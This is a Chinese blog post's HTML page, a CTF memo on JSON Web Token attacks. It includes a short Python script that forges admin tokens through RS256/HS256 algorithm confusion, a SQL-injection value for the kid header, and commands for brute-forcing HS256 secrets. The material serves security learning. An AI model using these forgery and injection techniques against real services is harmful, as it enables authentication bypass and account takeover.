@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>JWT备忘录 | Threezh1&#39;s blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="JWT,">
+  
+
+  <meta name="description" content="说在前面这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。 文章地址：https://www.anquanke.com/post/id/145540 所以这里就只作为一个备忘录，简单总结一下。 JWT (JSON Web Token)最常用的网址：https://jwt.io/ JWT由三部分组成：Header(头部), Payload(负载), Sig">
+<meta name="keywords" content="JWT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JWT备忘录">
+<meta property="og:url" content="http://yoursite.com/2019/05/17/JWT备忘录/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="说在前面这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。 文章地址：https://www.anquanke.com/post/id/145540 所以这里就只作为一个备忘录，简单总结一下。 JWT (JSON Web Token)最常用的网址：https://jwt.io/ JWT由三部分组成：Header(头部), Payload(负载), Sig">
+<meta property="og:locale" content="Chinese">
+<meta property="og:updated_time" content="2019-05-17T09:02:32.200Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JWT备忘录">
+<meta name="twitter:description" content="说在前面这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。 文章地址：https://www.anquanke.com/post/id/145540 所以这里就只作为一个备忘录，简单总结一下。 JWT (JSON Web Token)最常用的网址：https://jwt.io/ JWT由三部分组成：Header(头部), Payload(负载), Sig">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说在前面"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-JSON-Web-Token"><span class="toc-text">JWT (JSON Web Token)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#算法修改攻击"><span class="toc-text">算法修改攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header头中存在kid字段"><span class="toc-text">Header头中存在kid字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#密钥爆破"><span class="toc-text">密钥爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-JWT备忘录" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">JWT备忘录</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.05.17</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Threezh1</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Learning/">Learning</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。</p>
+<p>文章地址：<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a></p>
+<p>所以这里就只作为一个备忘录，简单总结一下。</p>
+<h2 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT (JSON Web Token)"></a>JWT (JSON Web Token)</h2><p>最常用的网址：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<p>JWT由三部分组成：Header(头部), Payload(负载), Signature(签名)</p>
+<pre><code>格式为：
+Header.Payload.Signature
+
+例如：(HS256)
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+或 (RS256)
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0EiXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiRbz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgmpdgXMguEIcoqPJ1n3pIWk_dUZegpqx0Lka21H6XxUTxiy8OcaarA8zdnPUnV6AmNP3ecFawIFYdvJB_cm-GvpCSbr8G8y_Mllj8f4x9nBH8pQux89_6gUY618iYv7tuPWBFfEbLxtF2pZS6YC1aSfLQxeNe8djT9YjpvRZA
+</code></pre><p>Header:</p>
+<pre><code>{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+
+alg属性表示签名的算法 (默认是 HMAC SHA256 即HS256)
+typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT
+</code></pre><p>Payload:</p>
+<pre><code>{
+  &quot;sub&quot;: &quot;1234567890&quot;,
+  &quot;name&quot;: &quot;John Doe&quot;,
+  &quot;admin&quot;: true
+}
+
+除了官方字段，还可以添加自定义字段。如这里的admin字段就是自定义字段。
+</code></pre><p>Signature:</p>
+<pre><code>Signature 部分是对前两部分的签名，防止数据篡改。
+
+服务器使用一个指定的密钥，按照下面的签名算法(默认为HS256)产生签名
+(RS256有一个公钥和一个私钥)
+
+HMACSHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  secret)
+
+RSASHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  PUBLIC KEY, PRIVATE KEY)
+</code></pre><p>然后将这三个部分分别base64编码后用“.”连接生成JSON Web Token</p>
+<p>话说文章里面的名字取的还蛮不错的。</p>
+<h3 id="算法修改攻击"><a href="#算法修改攻击" class="headerlink" title="算法修改攻击"></a>算法修改攻击</h3><p>条件：</p>
+<pre><code>JWT使用RS256攻击
+公钥可知
+不可解密私钥(怎么解密也不知道)
+</code></pre><p>利用：</p>
+<p>将公钥作为HS256的密钥</p>
+<p>使用python脚本生成(用jwt.io生成的用不了)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = open(<span class="string">'key.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"name"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure>
+<p>报错请参考文章内的解决办法</p>
+<h3 id="Header头中存在kid字段"><a href="#Header头中存在kid字段" class="headerlink" title="Header头中存在kid字段"></a>Header头中存在kid字段</h3><p>通过key查询私钥的语句类似于：</p>
+<pre><code>sql=&quot;select * from table where kid=$kid&quot;
+</code></pre><p>将kid修改为：</p>
+<pre><code>kid = 0 union select 12345
+</code></pre><p>根据环境情况修改kid的值，目的是得到或者控制私钥。</p>
+<pre><code>openssl常用命令
+
+//生成私钥
+openssl
+OpenSSL&gt; genrsa -out rsa_private_key.pem 1024 
+//产生公钥
+OpenSSL&gt; rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem writing RSA key
+</code></pre><h3 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h3><p>HS256可以尝试一下爆破</p>
+<pre><code>工具： https://github.com/brendan-rius/c-jwt-cracker
+
+使用： ./jwtcrack 加密值
+</code></pre><p>使用字典爆破</p>
+<pre><code>工具： https://github.com/Sjord/jwtcrack
+
+使用： crackjwt.py JWT dictionary.txt
+</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a></li>
+<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a></li>
+<li><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></li>
+</ul>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/05/15/川师线下CTF-Web-Writeup/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
